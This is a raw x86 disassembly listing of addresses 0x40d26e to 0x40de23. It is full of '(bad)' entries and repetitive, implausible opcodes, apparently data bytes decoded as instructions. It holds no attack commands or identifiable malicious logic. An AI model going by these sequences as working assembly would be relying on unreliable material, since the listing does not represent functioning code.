  40d26e:	call   0xec2cbb72
  40d273:	(bad)  
  40d274:	in     al,dx
  40d275:	out    dx,al
  40d276:	out    dx,al
  40d277:	push   eax
  40d279:	repnz repnz push esp
  40d27d:	cmc    
  40d27e:	idiv   bh
  40d280:	aam    0xc5
  40d282:	mov    bl,0xff
  40d284:	mov    ds,WORD PTR [ebp+0x24]
  40d287:	dec    DWORD PTR [ebp+0x56245c]
	...
  40d295:	add    BYTE PTR [eax],al
  40d297:	add    BYTE PTR [ebx-0x1500c89c],cl
  40d29d:	fst    st(2)
  40d29f:	(bad)  
  40d2a0:	jmp    0xceda:0xe9ffd0dc
  40d2a7:	(bad)  
  40d2a8:	call   0xe8409f86
  40d2ad:	xlat   BYTE PTR ds:[ebx]
  40d2ae:	retf   
  40d2af:	jmp    edi
  40d2b1:	(bad)  
  40d2b2:	leave  
  40d2b3:	jmp    esi
  40d2b5:	aad    0xc7
  40d2b7:	jmp    ebp
  40d2b9:	aam    0xc5
  40d2bb:	jmp    esp
  40d2bd:	rol    bl,cl
  40d2bf:	jmp    ebx
  40d2c1:	rol    edx,1
  40d2c3:	jmp    ebx
  40d2c5:	sar    BYTE PTR [edi-0x41301d01],1
  40d2cb:	jmp    ecx
  40d2cd:	int    0xbc
  40d2cf:	jmp    eax
  40d2d1:	retf   
  40d2d2:	mov    ebx,0xb9cadfff
  40d2d7:	(bad)  
  40d2d8:	(bad)  
  40d2da:	mov    dh,0xff
  40d2dc:	fmulp  st(0),st
  40d2de:	mov    ch,0xff
  40d2e0:	nop
  40d2e1:	arpl   WORD PTR [eax+ebx*8],si
  40d2e4:	jns    0x40d332
  40d2e6:	pop    ss
  40d2e7:	pop    ebp
  40d2e8:	adc    BYTE PTR [edx+eiz*1+0x2],0x0
	...
  40d301:	add    BYTE PTR [eax],al
  40d303:	add    BYTE PTR [edx-0x5df5db97],ah
  40d309:	imul   esp,DWORD PTR [ebx+ebp*4],0xff2469a2
  40d310:	(bad)  
  40d312:	fcos   
  40d314:	jecxz  0x40d2fd
  40d316:	out    0xff,eax
  40d318:	jecxz  0x40d301
  40d31a:	out    0xff,eax
  40d31c:	jecxz  0x40d305
  40d31e:	out    0xff,eax
  40d320:	jecxz  0x40d309
  40d322:	out    0xff,eax
  40d324:	jecxz  0x40d30d
  40d326:	out    0xff,eax
  40d328:	jecxz  0x40d311
  40d32a:	out    0xff,eax
  40d32c:	jecxz  0x40d315
  40d32e:	out    0xff,eax
  40d330:	in     eax,0xe9
  40d332:	call   0xec2dbc36
  40d337:	(bad)  
  40d338:	in     al,dx
  40d339:	out    dx,eax
  40d33a:	out    dx,eax
  40d33b:	(bad)  
  40d33c:	call   0x9240b627
  40d341:	pop    edi
  40d342:	and    al,0xff
  40d344:	(bad)  
  40d345:	pop    ebp
  40d346:	and    al,0xab
  40d348:	mov    ds,WORD PTR [ebp+0x24]
  40d34b:	or     al,BYTE PTR [eax]
	...
  40d355:	add    BYTE PTR [eax],al
  40d357:	add    BYTE PTR [ebp-0x1300c69a],cl
  40d35d:	loopne 0x40d334
  40d35f:	(bad)  
  40d360:	in     al,dx
  40d361:	(bad)  
  40d363:	(bad)  
  40d364:	jmp    0x40d344
  40d366:	sar    bh,cl
  40d368:	jmp    0xcfda:0xeaffd0dc
  40d36f:	(bad)  
  40d370:	jmp    0xe940a04e
  40d375:	fmul   st,st(3)
  40d377:	jmp    edi
  40d379:	xlat   BYTE PTR ds:[ebx]
  40d37a:	retf   0xe6ff
  40d37d:	aad    0xc7
  40d37f:	jmp    ebp
  40d381:	aam    0xc5
  40d383:	jmp    ebp
  40d385:	rol    ah,cl
  40d387:	jmp    esp
  40d389:	rol    edx,1
  40d38b:	jmp    ebx
  40d38d:	rol    al,1
  40d38f:	jmp    edx
  40d391:	iret   
  40d392:	mov    esi,0xbdcde2ff
  40d397:	jmp    ecx
  40d399:	int3   
  40d39a:	mov    ebx,0x34638eff
  40d39f:	out    0x76,eax
  40d3a1:	dec    ecx
  40d3a2:	adc    ebx,DWORD PTR [edx+0x0]
	...
  40d3c5:	add    BYTE PTR [eax],al
  40d3c7:	add    BYTE PTR [edx-0x5dbadb97],ah
  40d3cd:	imul   esp,DWORD PTR [edx*8-0xdb965e],0xffd9ddde
  40d3d8:	jecxz  0x40d3c1
  40d3da:	out    0xff,eax
  40d3dc:	jecxz  0x40d3c5
  40d3de:	out    0xff,eax
  40d3e0:	jecxz  0x40d3c9
  40d3e2:	out    0xff,eax
  40d3e4:	jecxz  0x40d3cd
  40d3e6:	out    0xff,eax
  40d3e8:	jecxz  0x40d3d1
  40d3ea:	out    0xff,eax
  40d3ec:	jecxz  0x40d3d5
  40d3ee:	out    0xff,eax
  40d3f0:	jecxz  0x40d3d9
  40d3f2:	out    0xff,eax
  40d3f4:	out    0xea,al
  40d3f6:	jmp    0xde23b8fa
  40d3fb:	call   DWORD PTR [ebp-0x6c00db9f]
  40d401:	pusha  
  40d402:	and    al,0xd5
  40d404:	xchg   ecx,eax
  40d405:	pop    edi
  40d406:	and    al,0x45
	...
  40d418:	mov    gs,WORD PTR [eax+0x3c]
  40d41b:	(bad)  
  40d41c:	out    dx,al
  40d41d:	loop   0x40d3f9
  40d41f:	(bad)  
  40d420:	in     eax,dx
  40d421:	loope  0x40d3fb
  40d423:	(bad)  
  40d424:	in     eax,dx
  40d425:	loope  0x40d3fe
  40d427:	(bad)  
  40d428:	in     al,dx
  40d429:	(bad)  
  40d42b:	(bad)  
  40d42c:	jmp    0x40d40c
  40d42e:	sar    edi,cl
  40d430:	jmp    0xcfdb:0xeaffd1dc
  40d437:	(bad)  
  40d438:	jmp    0xe940a217
  40d43d:	fmul   st,st(4)
  40d43f:	jmp    edi
  40d441:	xlat   BYTE PTR ds:[ebx]
  40d442:	retf   0xe6ff
  40d445:	aad    0xc8
  40d447:	jmp    esi
  40d449:	aam    0xc6
  40d44b:	jmp    ebp
  40d44d:	rol    ebp,cl
  40d44f:	jmp    esp
  40d451:	rol    bl,cl
  40d453:	jmp    ebx
  40d455:	rol    edx,1
  40d457:	dec    DWORD PTR [ebp+0x75ea3362]
  40d45d:	inc    edi
  40d45e:	adc    DWORD PTR [ebp-0x7f],esp
  40d461:	push   esp
  40d462:	and    DWORD PTR [eax+eax*1],ecx
	...
  40d489:	add    BYTE PTR [eax],al
  40d48b:	add    BYTE PTR [edx-0x5da6db97],ah
  40d491:	imul   esp,DWORD PTR [edx*8-0xdb965e],0xffa9bece
  40d49c:	loope  0x40d482
  40d49e:	loope  0x40d49f
  40d4a0:	jecxz  0x40d489
  40d4a2:	out    0xff,eax
  40d4a4:	jecxz  0x40d48d
  40d4a6:	out    0xff,eax
  40d4a8:	jecxz  0x40d491
  40d4aa:	out    0xff,eax
  40d4ac:	jecxz  0x40d495
  40d4ae:	out    0xff,eax
  40d4b0:	loop   0x40d496
  40d4b2:	loop   0x40d4b3
  40d4b4:	into   
  40d4b5:	mov    edi,0x6398ffaa
  40d4ba:	and    al,0xff
  40d4bc:	xchg   esi,eax
  40d4bd:	bound  esp,QWORD PTR [edx*8+0x59246194]
	...
  40d4d8:	mov    gs,WORD PTR [ecx+0x3c]
  40d4db:	push   eax
  40d4dd:	out    0xde,al
  40d4df:	(bad)  
  40d4e0:	out    dx,eax
  40d4e1:	in     eax,0xdc
  40d4e3:	(bad)  
  40d4e4:	out    dx,al
  40d4e5:	jecxz  0x40d4c1
  40d4e7:	(bad)  
  40d4e8:	out    dx,al
  40d4e9:	loop   0x40d4c3
  40d4eb:	(bad)  
  40d4ec:	in     eax,dx
  40d4ed:	loope  0x40d4c6
  40d4ef:	(bad)  
  40d4f0:	in     eax,dx
  40d4f1:	loopne 0x40d4c8
  40d4f3:	(bad)  
  40d4f4:	jmp    0x40d4d4
  40d4f6:	aam    0xff
  40d4f8:	jmp    0x40d4d7
  40d4fa:	sar    bh,cl
  40d4fc:	jmp    0xceda:0xe9ffd0dc
  40d503:	(bad)  
  40d504:	call   0xe940a1e2
  40d509:	fmul   st,st(2)
  40d50b:	jmp    esi
  40d50d:	xlat   BYTE PTR ds:[ebx]
  40d50e:	leave  
  40d50f:	jmp    esi
  40d511:	aad    0xc7
  40d513:	dec    DWORD PTR [esi+0x76cf3564]
  40d519:	inc    esi
  40d51a:	andnps xmm0,XMMWORD PTR [ebx+0x62256]
	...
  40d54d:	add    BYTE PTR [eax],al
  40d54f:	add    BYTE PTR [edx-0x5dbadb97],ah
  40d555:	imul   esp,DWORD PTR [ebx+ebp*4],0xff2469a2
  40d55c:	mov    ah,0x8c
  40d55e:	pop    edx
  40d55f:	dec    ecx
  40d561:	mov    bh,0x9d
  40d563:	(bad)  
  40d564:	(bad)  
  40d566:	(bad)  
  40d567:	(bad)  
  40d568:	fcmovbe st,st(7)
  40d56a:	iret   
  40d56b:	inc    esp
  40d56d:	scas   al,BYTE PTR es:[edi]
  40d56e:	nop
  40d56f:	push   DWORD PTR [eax-0x6400a577]
  40d575:	fs and al,0xff
  40d578:	call   0x2463:0x98ab2464
  40d57f:	inc    ebp
	...
  40d598:	mov    gs,WORD PTR [eax+0x3b]
  40d59b:	push   edx
  40d59d:	jmp    0xe932d583
  40d5a2:	(bad)  
  40d5a4:	lock out 0xde,al
  40d5a7:	(bad)  
  40d5a8:	out    dx,eax
  40d5a9:	in     eax,0xdc
  40d5ab:	(bad)  
  40d5ac:	out    dx,eax
  40d5ad:	in     al,0xdb
  40d5af:	(bad)  
  40d5b0:	out    dx,al
  40d5b1:	jecxz  0x40d58b
  40d5b3:	(bad)  
  40d5b4:	in     eax,dx
  40d5b5:	loope  0x40d58e
  40d5b7:	(bad)  
  40d5b8:	in     al,dx
  40d5b9:	loopne 0x40d591
  40d5bb:	(bad)  
  40d5bc:	in     al,dx
  40d5bd:	(bad)  
  40d5bf:	(bad)  
  40d5c0:	jmp    0x40d5a0
  40d5c2:	sar    bh,cl
  40d5c4:	jmp    0xcedb:0xe9ffd0dc
  40d5cb:	(bad)  
  40d5cc:	call   0x9240a3aa
  40d5d1:	addr16 cmp edx,esp
  40d5d4:	jp     0x40d620
  40d5d6:	adc    eax,0x46
	...
  40d613:	add    BYTE PTR [edx-0x5df5db97],ah
  40d619:	imul   esp,DWORD PTR [esi+edx*2],0x972469a2
  40d620:	mov    ds:0xa2cd2469,al
  40d625:	imul   esp,DWORD PTR [ecx+esi*8],0xf12468a0
  40d62c:	lahf   
  40d62d:	push   0x669ecd24
  40d632:	and    al,0x97
  40d634:	popf   
  40d635:	gs and al,0x56
  40d638:	fwait
  40d639:	gs and al,0xa
	...
  40d658:	mov    gs,WORD PTR [ecx+0x3d]
  40d65b:	push   ebx
  40d65d:	in     al,dx
  40d65e:	in     eax,0xff
  40d660:	bnd jmp 0x40d646
  40d663:	push   edx
  40d665:	jmp    0xe932d64c
  40d66a:	loopne 0x40d66b
  40d66c:	icebp  
  40d66d:	out    0xdf,eax
  40d66f:	push   eax
  40d671:	out    0xdd,al
  40d673:	(bad)  
  40d674:	out    dx,eax
  40d675:	in     al,0xdb
  40d677:	(bad)  
  40d678:	out    dx,al
  40d679:	jecxz  0x40d654
  40d67b:	(bad)  
  40d67c:	in     eax,dx
  40d67d:	loop   0x40d656
  40d67f:	(bad)  
  40d680:	in     eax,dx
  40d681:	loopne 0x40d659
  40d683:	(bad)  
  40d684:	in     al,dx
  40d685:	(bad)  
  40d687:	(bad)  
  40d688:	in     al,dx
  40d689:	(bad)  
  40d68b:	call   DWORD PTR [eax+0x7ad13666]
  40d691:	dec    ebx
  40d692:	adc    eax,0x2456843e
  40d697:	add    DWORD PTR [eax],eax
	...
  40d715:	add    BYTE PTR [eax],al
  40d717:	add    BYTE PTR [edi-0xa00c096],cl
  40d71d:	in     eax,dx
  40d71e:	call   0xe72dcc22
  40d723:	push   ebx
  40d725:	jmp    0x40d70c
  40d727:	push   ebx
  40d729:	jmp    0x40d70f
  40d72b:	push   edx
  40d72d:	jmp    0xe933d715
  40d732:	loopne 0x40d733
  40d734:	lock out 0xdf,eax
  40d737:	push   eax
  40d739:	out    0xdd,al
  40d73b:	(bad)  
  40d73c:	out    dx,eax
  40d73d:	in     eax,0xdc
  40d73f:	(bad)  
  40d740:	out    dx,eax
  40d741:	jecxz  0x40d71e
  40d743:	(bad)  
  40d744:	in     eax,dx
  40d745:	loop   0x40d720
  40d747:	dec    DWORD PTR [edi+0x7be93765]
  40d74d:	dec    esi
  40d74e:	sbb    dl,BYTE PTR [esi+0x0]
	...
  40d7d5:	add    BYTE PTR [eax],al
  40d7d7:	add    BYTE PTR [eax-0x800bf96],dl
  40d7dd:	lock jmp 0x40d7df
  40d7e0:	div    al
  40d7e2:	jmp    0x40d7e3
  40d7e4:	cmc    
  40d7e5:	out    dx,al
  40d7e6:	jmp    0xe92ecdea
  40d7eb:	push   esp
  40d7ed:	in     al,dx
  40d7ee:	in     eax,0xff
  40d7f0:	repz jmp 0x40d7d8
  40d7f3:	push   edx
  40d7f5:	jmp    0xffe1:0xe9f1ffe2
  40d7fc:	icebp  
  40d7fd:	out    0xe0,eax
  40d7ff:	push   eax
  40d801:	out    0xde,eax
  40d803:	dec    DWORD PTR [edi+0x7ee53765]
  40d809:	push   ebx
  40d80a:	and    BYTE PTR [ebx-0x7d],cl
  40d80d:	push   edi
  40d80e:	or     DWORD PTR es:[eax],eax
	...
  40d895:	add    BYTE PTR [eax],al
  40d897:	add    BYTE PTR [eax-0x700bd93],dl
  40d89d:	repz out dx,eax
  40d89f:	push   edi
  40d8a1:	icebp  
  40d8a2:	in     eax,dx
  40d8a3:	push   edi
  40d8a5:	icebp  
  40d8a6:	in     al,dx
  40d8a7:	push   esi
  40d8a9:	lock jmp 0xf5ff:0xeaeff5ff
  40d8b1:	out    dx,al
  40d8b2:	out    0xff,eax
  40d8b4:	hlt    
  40d8b5:	in     eax,dx
  40d8b6:	out    0xff,eax
  40d8b8:	hlt    
  40d8b9:	jmp    0x40d89f
  40d8bb:	push   edx
  40d8bd:	jmp    0xe73b:0x6891ffe3
  40d8c4:	sbb    DWORD PTR [eax+0x26],0x5f
	...
  40d957:	add    BYTE PTR [eax-0x500be93],dl
  40d95d:	cmc    
  40d95e:	repnz (bad) 
  40d960:	stc    
  40d961:	hlt    
  40d962:	lock (bad) 
  40d964:	clc    
  40d965:	repz out dx,eax
  40d967:	(bad)  
  40d968:	clc    
  40d969:	repz out dx,al
  40d96b:	push   edi
  40d96d:	icebp  
  40d96e:	in     eax,dx
  40d96f:	push   esi
  40d971:	lock in al,dx
  40d973:	push   esi
  40d975:	out    dx,eax
  40d976:	jmp    0x92ff:0xe9eef5ff
  40d97d:	imul   edi,DWORD PTR [ebx+ebp*8],0x69295981
  40d984:	mov    DWORD PTR [edx+0x33],esp
  40d987:	or     BYTE PTR [eax],al
	...
  40da15:	add    BYTE PTR [eax],al
  40da17:	add    BYTE PTR [edi-0x500c296],cl
  40da1d:	clc    
  40da1e:	hlt    
  40da1f:	(bad)  
  40da20:	cli    
  40da21:	div    esp
  40da23:	(bad)  
  40da24:	stc    
  40da25:	div    dl
  40da27:	(bad)  
  40da28:	clc    
  40da29:	hlt    
  40da2a:	icebp  
  40da2b:	(bad)  
  40da2c:	clc    
  40da2d:	hlt    
  40da2e:	lock push edi
  40da31:	repz out dx,al
  40da33:	push   edi
  40da35:	repnz out dx,al
  40da37:	call   DWORD PTR [ebx-0x7110bb91]
  40da3d:	addr16 cmp eax,0x426e9248
  40da43:	or     eax,0x0
	...
  40da94:	mov    ds,WORD PTR [ebp+0x24]
  40da97:	or     cl,BYTE PTR [ebp-0x74a9dba4]
  40da9d:	pop    ebx
  40da9e:	and    al,0x97
  40daa0:	mov    bl,BYTE PTR [edx+0x24]
  40daa3:	int    0x88
  40daa5:	pop    ecx
  40daa6:	and    al,0xf1
  40daa8:	xchg   DWORD PTR [ecx+0x24],ebx
  40daab:	icebp  
  40daac:	xchg   BYTE PTR [eax+0x24],bl
  40daaf:	int    0x85
  40dab1:	pop    eax
  40dab2:	and    al,0x97
  40dab4:	test   BYTE PTR [edi+0x24],dl
  40dab7:	push   esi
  40dab8:	test   BYTE PTR [edi+0x24],dl
  40dabb:	or     al,BYTE PTR [eax]
	...
  40dad5:	add    BYTE PTR [eax],al
  40dad7:	add    BYTE PTR [esi-0x300c498],cl
  40dadd:	cli    
  40dade:	idiv   edi
  40dae0:	sti    
  40dae1:	stc    
  40dae2:	idiv   edi
  40dae4:	sti    
  40dae5:	div    ebp
  40dae7:	(bad)  
  40dae8:	cli    
  40dae9:	div    esp
  40daeb:	(bad)  
  40daec:	stc    
  40daed:	cmc    
  40daee:	repz (bad) 
  40daf0:	stc    
  40daf1:	cmc    
  40daf2:	icebp  
  40daf3:	call   DWORD PTR [ebx-0x5700bd92]
  40daf9:	mov    BYTE PTR [esi-0x1],ah
  40dafc:	mov    ecx,0xb9ff7f9d
  40db01:	popf   
  40db02:	jg     0x40db03
  40db04:	mov    ecx,0xb9ff7f9d
  40db09:	popf   
  40db0a:	jg     0x40db0b
  40db0c:	mov    ecx,0xb9ff7f9d
  40db11:	popf   
  40db12:	jg     0x40db13
  40db14:	mov    ecx,0xb9ff7f9d
  40db19:	popf   
  40db1a:	jg     0x40db1b
  40db1c:	mov    ecx,0xb9ff7f9d
  40db21:	popf   
  40db22:	jg     0x40db23
  40db24:	mov    ecx,0xb9ff7f9d
  40db29:	popf   
  40db2a:	jg     0x40db2b
  40db2c:	mov    ecx,0xb9ff7f9d
  40db31:	popf   
  40db32:	jg     0x40db33
  40db34:	mov    ecx,0xb9ff7f9d
  40db39:	popf   
  40db3a:	jg     0x40db3b
	...
  40db50:	xchg   edx,eax
  40db51:	pop    edi
  40db52:	and    al,0x45
  40db54:	nop
  40db55:	pop    esi
  40db56:	and    al,0xab
  40db58:	mov    ds,WORD PTR [esp-0x1]
  40db5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db5d:	sbb    DWORD PTR [edx-0x1],0xffffffc2
  40db61:	mov    dl,0x9d
  40db63:	(bad)  
  40db64:	fcom   st(6)
  40db66:	iret   
  40db67:	call   ebp
  40db69:	ror    ebx,cl
  40db6b:	(bad)  
  40db6c:	mov    edx,0xa0ff90a7
  40db71:	sbb    BYTE PTR [edx-0x1],0x84
  40db75:	push   edi
  40db76:	and    al,0xff
  40db78:	test   BYTE PTR [edi+0x24],dl
  40db7b:	stos   DWORD PTR es:[edi],eax
  40db7c:	test   BYTE PTR [edi+0x24],dl
  40db7f:	inc    ebp
	...
  40db98:	mov    gs,WORD PTR [ecx+0x3a]
  40db9b:	(bad)  
  40db9c:	std    
  40db9d:	sti    
  40db9e:	stc    
  40db9f:	(bad)  
  40dba0:	cld    
  40dba1:	sti    
  40dba2:	stc    
  40dba3:	(bad)  
  40dba4:	sti    
  40dba5:	cli    
  40dba6:	idiv   edi
  40dba8:	sti    
  40dba9:	stc    
  40dbaa:	idiv   edi
  40dbac:	sti    
  40dbad:	clc    
  40dbae:	cmc    
  40dbaf:	call   DWORD PTR [ecx-0x5100be94]
  40dbb5:	xchg   ecx,eax
  40dbb6:	jo     0x40dbb7
  40dbb8:	mov    bh,0x9b
  40dbba:	jge    0x40dbbb
  40dbbc:	mov    ecx,0xb9ff7f9d
  40dbc1:	popf   
  40dbc2:	jg     0x40dbc3
  40dbc4:	mov    ecx,0xb9ff7f9d
  40dbc9:	popf   
  40dbca:	jg     0x40dbcb
  40dbcc:	mov    ecx,0xb9ff7f9d
  40dbd1:	popf   
  40dbd2:	jg     0x40dbd3
  40dbd4:	mov    ecx,0xb9ff7f9d
  40dbd9:	popf   
  40dbda:	jg     0x40dbdb
  40dbdc:	mov    ecx,0xb9ff7f9d
  40dbe1:	popf   
  40dbe2:	jg     0x40dbe3
  40dbe4:	mov    ecx,0xb9ff7f9d
  40dbe9:	popf   
  40dbea:	jg     0x40dbeb
  40dbec:	mov    ecx,0xb9ff7f9d
  40dbf1:	popf   
  40dbf2:	jg     0x40dbf3
  40dbf4:	mov    ecx,0xb9ff7f9d
  40dbf9:	popf   
  40dbfa:	jg     0x40dbfb
	...
  40dc0c:	xchg   ebp,eax
  40dc0d:	popa   
  40dc0e:	and    al,0x59
  40dc10:	xchg   ebx,eax
  40dc11:	pusha  
  40dc12:	and    al,0xd5
  40dc14:	xchg   ecx,eax
  40dc15:	pop    edi
  40dc16:	and    al,0xff
  40dc18:	aam    0xc6
  40dc1a:	mov    bl,0xff
  40dc1c:	div    ch
  40dc1e:	repz (bad) 
  40dc20:	cld    
  40dc21:	cld    
  40dc22:	cld    
  40dc23:	(bad)  
  40dc24:	std    
  40dc25:	std    
  40dc26:	std    
  40dc27:	(bad)  
  40dc28:	std    
  40dc29:	std    
  40dc2a:	std    
  40dc2b:	(bad)  
  40dc2c:	std    
  40dc2d:	std    
  40dc2e:	std    
  40dc2f:	(bad)  
  40dc30:	cli    
  40dc31:	clc    
  40dc32:	idiv   edi
  40dc34:	(bad)  
  40dc35:	enter  0xffb7,0x84
  40dc39:	push   edi
  40dc3a:	and    al,0xff
  40dc3c:	test   BYTE PTR [edi+0x24],dl
  40dc3f:	aad    0x84
  40dc41:	push   edi
  40dc42:	and    al,0x59
	...
  40dc58:	nop
  40dc59:	imul   edi,DWORD PTR [edi],0xffffffff
  40dc5c:	std    
  40dc5d:	std    
  40dc5e:	cld    
  40dc5f:	(bad)  
  40dc60:	std    
  40dc61:	cld    
  40dc62:	cld    
  40dc63:	(bad)  
  40dc64:	cld    
  40dc65:	sti    
  40dc66:	cli    
  40dc67:	(bad)  
  40dc68:	cld    
  40dc69:	cli    
  40dc6a:	stc    
  40dc6b:	jmp    DWORD PTR [eax-0x2200a27f]
  40dc71:	rol    edi,cl
  40dc73:	(bad)  
  40dc74:	stc    
  40dc75:	div    esp
  40dc77:	(bad)  
  40dc78:	(bad)  
  40dc79:	(bad)  
  40dc7a:	(bad)  
  40dc7b:	(bad)  
  40dc7c:	(bad)  
  40dc7d:	(bad)  
  40dc7e:	(bad)  
  40dc7f:	(bad)  
  40dc80:	(bad)  
  40dc81:	(bad)  
  40dc82:	(bad)  
  40dc83:	(bad)  
  40dc84:	(bad)  
  40dc85:	(bad)  
  40dc86:	(bad)  
  40dc87:	(bad)  
  40dc88:	(bad)  
  40dc89:	(bad)  
  40dc8a:	(bad)  
  40dc8b:	(bad)  
  40dc8c:	(bad)  
  40dc8d:	(bad)  
  40dc8e:	(bad)  
  40dc8f:	(bad)  
  40dc90:	(bad)  
  40dc91:	(bad)  
  40dc92:	(bad)  
  40dc93:	(bad)  
  40dc94:	(bad)  
  40dc95:	(bad)  
  40dc96:	(bad)  
  40dc97:	(bad)  
  40dc98:	(bad)  
  40dc99:	(bad)  
  40dc9a:	(bad)  
  40dc9b:	(bad)  
  40dc9c:	(bad)  
  40dc9d:	(bad)  
  40dc9e:	(bad)  
  40dc9f:	(bad)  
  40dca0:	(bad)  
  40dca1:	(bad)  
  40dca2:	(bad)  
  40dca3:	(bad)  
  40dca4:	(bad)  
  40dca5:	(bad)  
  40dca6:	(bad)  
  40dca7:	(bad)  
  40dca8:	(bad)  
  40dca9:	(bad)  
  40dcaa:	(bad)  
  40dcab:	(bad)  
  40dcac:	(bad)  
  40dcad:	(bad)  
  40dcae:	(bad)  
  40dcaf:	(bad)  
  40dcb0:	(bad)  
  40dcb1:	(bad)  
  40dcb2:	(bad)  
  40dcb3:	(bad)  
  40dcb4:	(bad)  
  40dcb5:	(bad)  
  40dcb6:	(bad)  
  40dcb7:	(bad)  
  40dcb8:	mov    ecx,0xff7f9d
	...
  40dcc5:	add    BYTE PTR [eax],al
  40dcc7:	add    BYTE PTR [eax-0x68badb9d],bl
  40dccd:	bound  esp,QWORD PTR [edx*8-0xdb9e6b]
  40dcd4:	call   0xf540bfc0
  40dcd9:	div    dh
  40dcdb:	(bad)  
  40dcdc:	clc    
  40dcdd:	clc    
  40dcde:	stc    
  40dcdf:	(bad)  
  40dce0:	sti    
  40dce1:	sti    
  40dce2:	sti    
  40dce3:	(bad)  
  40dce4:	std    
  40dce5:	std    
  40dce6:	std    
  40dce7:	(bad)  
  40dce8:	std    
  40dce9:	std    
  40dcea:	std    
  40dceb:	(bad)  
  40dcec:	std    
  40dced:	std    
  40dcee:	std    
  40dcef:	(bad)  
  40dcf0:	std    
  40dcf1:	std    
  40dcf2:	std    
  40dcf3:	(bad)  
  40dcf4:	std    
  40dcf5:	std    
  40dcf6:	std    
  40dcf7:	push   esp
  40dcf9:	lock in eax,dx
  40dcfb:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  40dd02:	and    al,0xd5
  40dd04:	test   BYTE PTR [edi+0x24],dl
  40dd07:	inc    ebp
	...
  40dd18:	xchg   ecx,eax
  40dd19:	ins    DWORD PTR es:[edi],dx
  40dd1a:	inc    ebx
  40dd1b:	(bad)  
  40dd1c:	(bad)  
  40dd1d:	(bad)  
  40dd1e:	(bad)  
  40dd1f:	(bad)  
  40dd20:	(bad)  
  40dd21:	(bad)  
  40dd22:	std    
  40dd23:	(bad)  
  40dd24:	(bad)  
  40dd25:	std    
  40dd26:	cld    
  40dd27:	call   FWORD PTR [ebx-0x2d00aa87]
  40dd2d:	les    esi,FWORD PTR [edi+edi*8-0x30203]
  40dd34:	(bad)  
  40dd35:	(bad)  
  40dd36:	(bad)  
  40dd37:	(bad)  
  40dd38:	(bad)  
  40dd39:	(bad)  
  40dd3a:	(bad)  
  40dd3b:	(bad)  
  40dd3c:	(bad)  
  40dd3d:	(bad)  
  40dd3e:	(bad)  
  40dd3f:	(bad)  
  40dd40:	(bad)  
  40dd41:	(bad)  
  40dd42:	(bad)  
  40dd43:	(bad)  
  40dd44:	(bad)  
  40dd45:	(bad)  
  40dd46:	(bad)  
  40dd47:	(bad)  
  40dd48:	(bad)  
  40dd49:	(bad)  
  40dd4a:	(bad)  
  40dd4b:	(bad)  
  40dd4c:	(bad)  
  40dd4d:	(bad)  
  40dd4e:	(bad)  
  40dd4f:	(bad)  
  40dd50:	(bad)  
  40dd51:	(bad)  
  40dd52:	(bad)  
  40dd53:	(bad)  
  40dd54:	(bad)  
  40dd55:	(bad)  
  40dd56:	(bad)  
  40dd57:	(bad)  
  40dd58:	(bad)  
  40dd59:	(bad)  
  40dd5a:	(bad)  
  40dd5b:	(bad)  
  40dd5c:	(bad)  
  40dd5d:	(bad)  
  40dd5e:	(bad)  
  40dd5f:	(bad)  
  40dd60:	(bad)  
  40dd61:	(bad)  
  40dd62:	(bad)  
  40dd63:	(bad)  
  40dd64:	(bad)  
  40dd65:	(bad)  
  40dd66:	(bad)  
  40dd67:	(bad)  
  40dd68:	(bad)  
  40dd69:	(bad)  
  40dd6a:	(bad)  
  40dd6b:	(bad)  
  40dd6c:	(bad)  
  40dd6d:	(bad)  
  40dd6e:	(bad)  
  40dd6f:	(bad)  
  40dd70:	(bad)  
  40dd71:	(bad)  
  40dd72:	(bad)  
  40dd73:	(bad)  
  40dd74:	(bad)  
  40dd75:	(bad)  
  40dd76:	(bad)  
  40dd77:	(bad)  
  40dd78:	mov    ecx,0xff7f9d
  40dd7d:	add    BYTE PTR [eax],al
  40dd7f:	add    BYTE PTR [eax],al
  40dd81:	add    BYTE PTR [eax],al
  40dd83:	add    BYTE PTR [ebx-0x66f5db9b],bl
  40dd89:	fs and al,0xab
  40dd8c:	cwde   
  40dd8d:	arpl   WORD PTR [edi+edi*8],sp
  40dd90:	in     al,0xe1
  40dd92:	fdivp  st(7),st
  40dd94:	in     al,dx
  40dd95:	out    dx,al
  40dd96:	out    dx,eax
  40dd97:	push   eax
  40dd99:	repnz repnz push esp
  40dd9d:	cmc    
  40dd9e:	cmc    
  40dd9f:	push   edi
  40dda1:	clc    
  40dda2:	stc    
  40dda3:	(bad)  
  40dda4:	sti    
  40dda5:	sti    
  40dda6:	cld    
  40dda7:	(bad)  
  40dda8:	std    
  40dda9:	std    
  40ddaa:	std    
  40ddab:	(bad)  
  40ddac:	std    
  40ddad:	std    
  40ddae:	std    
  40ddaf:	(bad)  
  40ddb0:	std    
  40ddb1:	std    
  40ddb2:	std    
  40ddb3:	(bad)  
  40ddb4:	std    
  40ddb5:	std    
  40ddb6:	std    
  40ddb7:	(bad)  
  40ddb8:	std    
  40ddb9:	std    
  40ddba:	std    
  40ddbb:	push   esp
  40ddbd:	lock in eax,dx
  40ddbf:	inc    DWORD PTR [ebp-0x7b00dba8]
  40ddc5:	push   edi
  40ddc6:	and    al,0xab
  40ddc8:	test   BYTE PTR [edi+0x24],dl
  40ddcb:	or     al,BYTE PTR [eax]
	...
  40ddd5:	add    BYTE PTR [eax],al
  40ddd7:	add    BYTE PTR [ecx-0xbd93],dl
  40dddd:	(bad)  
  40ddde:	(bad)  
  40dddf:	(bad)  
  40dde0:	(bad)  
  40dde1:	(bad)  
  40dde2:	(bad)  
  40dde3:	call   FWORD PTR [edx-0x4800ac86]
  40dde9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddea:	pushf  
  40ddeb:	(bad)  
  40ddec:	mov    esp,0xbfffabb0
  40ddf1:	mov    ah,0xb2
  40ddf3:	(bad)  
  40ddf4:	mov    edi,0xbfffb2b4
  40ddf9:	mov    ah,0xb2
  40ddfb:	(bad)  
  40ddfc:	mov    edi,0xbfffb2b4
  40de01:	mov    ah,0xb2
  40de03:	(bad)  
  40de04:	mov    edi,0xbfffb2b4
  40de09:	mov    ah,0xb2
  40de0b:	(bad)  
  40de0c:	mov    edi,0xbfffb2b4
  40de11:	mov    ah,0xb2
  40de13:	(bad)  
  40de14:	mov    edi,0xbfffb2b4
  40de19:	mov    ah,0xb2
  40de1b:	(bad)  
  40de1c:	mov    edi,0xbfffb2b4
  40de21:	mov    ah,0xb2
  40de23:	(bad)  
